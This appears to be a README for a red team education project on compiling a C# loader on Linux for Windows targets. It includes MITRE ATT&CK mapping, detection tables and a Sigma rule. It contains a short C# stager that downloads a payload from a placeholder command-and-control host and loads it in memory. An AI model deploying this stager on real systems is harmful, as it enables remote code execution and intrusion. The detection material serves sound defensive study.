# 🔀 Cross-Platform C# Loader — Linux-to-Windows Payload Staging

> A red team research project demonstrating how a C# payload can be compiled on Linux and staged for execution on a Windows target — documenting what defenders see at each step.

![Language](https://img.shields.io/badge/language-C%23%20%2F%20Bash-178600?style=flat-square)
![Type](https://img.shields.io/badge/type-Red%20Team%20Education-c5283d?style=flat-square)
![Framework](https://img.shields.io/badge/mapped-MITRE%20ATT%26CK-c5283d?style=flat-square)

> ⚠️ **Disclaimer:** This project was built in an isolated lab environment for red team research and education. Cross-platform loader techniques are documented here to help defenders understand what they're detecting. Use only in authorized environments.

---

## 🎯 Overview

Real red team operators often work from Linux (Kali) and need to deliver payloads to Windows targets. Understanding the full compilation-to-delivery pipeline is essential for both red teamers and the blue teamers who need to detect it.

This project covers:
1. **Cross-platform C# compilation** using `dotnet` CLI or Mono on Linux
2. **PE staging concepts** — how the resulting executable is packaged and delivered
3. **Common delivery mechanisms** — HTTP staging, SMB drops, base64-encoded strings in scripts
4. **What each stage looks like to a defender**

---

## 🧰 Skills & Technologies

- C# (.NET / .NET Core)
- dotnet CLI on Linux (cross-compilation target: `win-x64`)
- PE (Portable Executable) format fundamentals
- Payload staging concepts (stage 0 / stager → stage 1 / payload)
- Encoding and delivery: base64, HTTP serving
- Process concepts: parent PID spoofing, process hollowing (documented, not implemented)

---

## ⚙️ How Cross-Platform C# Compilation Works

Modern .NET Core / .NET 6+ fully supports building Windows executables from Linux:

```bash
# Install .NET SDK on Linux
sudo apt install dotnet-sdk-8.0

# Create a new C# console project
dotnet new console -n Loader

# Build a self-contained Windows x64 executable
dotnet publish -r win-x64 --self-contained true -c Release -o ./dist

# Result: dist/Loader.exe — a fully functional Windows PE from a Linux build
```

The output is a standard PE that runs on any compatible Windows version — no runtime dependency required with `--self-contained`.

### Staging Architecture (conceptual)

```
[Attacker — Linux]                          [Target — Windows]
      │                                             │
      │  dotnet publish → Loader.exe               │
      │                                             │
      │  python3 -m http.server 8080               │
      │           ◄─────────── (HTTP GET /Loader.exe) ──┤
      │                                             │
      │  Loader.exe delivered                       │
      │                                       executes on target
```

### Stager Pattern (minimal C# stager)

```csharp
// Conceptual stager — downloads and executes stage 2 in memory
// This pattern is what EDRs are trained to detect
using System.Net;
using System.Reflection;

var url = "http://<C2_HOST>/payload.bin";  // placeholder
var bytes = new WebClient().DownloadData(url);
var asm = Assembly.Load(bytes);
asm.EntryPoint?.Invoke(null, new object[] { new string[0] });
```

---

## 🗺️ MITRE ATT&CK Mapping

| Technique | ID | Where it applies |
|-----------|----|-|
| Ingress Tool Transfer | T1105 | Delivering the compiled PE to the Windows target |
| Reflective Code Loading | T1620 | Loading stage 2 payload in memory via Assembly.Load |
| Obfuscated Files or Information | T1027 | Base64 or XOR encoding of payload bytes |
| Command and Scripting Interpreter: PowerShell | T1059.001 | Often used as the delivery mechanism |
| Process Injection (advanced) | T1055 | Follow-on stage using the loaded payload |

---

## 🛡️ Detection & Defensive Relevance

### Detection opportunities at each stage

| Stage | What defenders can see | Detection |
|-------|----------------------|-----------|
| Build (Linux) | Nothing — all on attacker-controlled system | N/A |
| HTTP delivery | Web server logs, proxy logs, firewall flow logs | Alert on: exe downloaded from external HTTP (not HTTPS), unusual UA strings, unknown external IP |
| Process execution | Sysmon Event ID 1 (process create), parent-child relationships | Alert on: cmd.exe/powershell.exe → unexpected child spawning a .exe from temp path |
| In-memory loading | ETW .NET events, AMSI (if not bypassed) | Alert on: `Assembly.Load(byte[])` from a network-sourced process |
| C2 beacon | Network flow data, DNS | Alert on: regular-interval connections to new external IPs, unusual beacon patterns |

### Sample Sigma rule for suspicious .exe from temp path

```yaml
title: Executable Launched from User Temp Directory
status: experimental
tags:
  - attack.execution
  - attack.t1105
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|contains:
      - '\AppData\Local\Temp\'
      - '\AppData\Roaming\'
    Image|endswith: '.exe'
  filter:
    Image|contains:
      - '\AppData\Local\Temp\Microsoft\'   # legitimate MS installers
  condition: selection and not filter
level: medium
```

### Why this matters for defenders

- **The build step happens completely off-net** — defenders get zero visibility into what's being prepared. The first detection opportunity is at delivery.
- **Self-contained .NET executables are large but self-sufficient** — they don't require a .NET runtime on the target, which means no dependency that could tip off an analyst checking installed software.
- **Process lineage is the tell.** Legitimate software doesn't download a .exe from an external IP and immediately execute it. Parent-child process trees are the primary detection surface.

---

## 📁 Source Layout

```
src/
├── MinimalLoader/
│   ├── Program.cs          ← Stage 0 stager (HTTP download + Assembly.Load)
│   └── MinimalLoader.csproj
├── PayloadStub/
│   ├── Program.cs          ← Placeholder payload for testing
│   └── PayloadStub.csproj
└── build.sh                ← Cross-compile from Linux to win-x64
```

---

## 📚 What I Learned

- **dotnet CLI's cross-compilation is seamless** — the toolchain handles PE generation, manifest embedding, and architecture targeting without needing a Windows build server.
- **Self-contained executables change the threat model** — no runtime dependency reduces the attacker's footprint and prerequisites, but also makes the binary larger (a potential indicator).
- **Detection has to happen on the Windows side** — since the build is fully off-network, all detection logic has to focus on delivery and execution behaviors, not the artifact creation itself.
- **Memory-resident payloads are the hardest to catch** — once a payload is loaded via `Assembly.Load` and running in-process, file-based scanning has no opportunity to flag it.
